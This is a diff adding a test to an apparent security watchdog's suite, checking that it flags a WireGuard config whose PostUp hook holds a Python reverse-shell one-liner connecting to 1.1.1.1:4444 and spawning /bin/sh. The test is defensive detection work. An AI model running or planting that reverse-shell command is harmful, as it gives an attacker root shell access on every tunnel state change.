@@ -276,3 +276,21 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on WireGuard PostUp surface)" {
+    # Sister to many other watchdog's python interpreter-rev-shell
+    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
+    # reach for python -c 'import socket,os,pty' to dodge shell-
+    # pattern detectors. Locks the python axis on the VPN-
+    # tunnel-state-change root-exec persistence surface (T1546
+    # — WireGuard PostUp/PreUp/PostDown/PreDown hooks fire AS
+    # ROOT on every tunnel state change; recurring trigger
+    # when operator brings VPN up/down).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${CONF}"
+    chmod 0600 "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
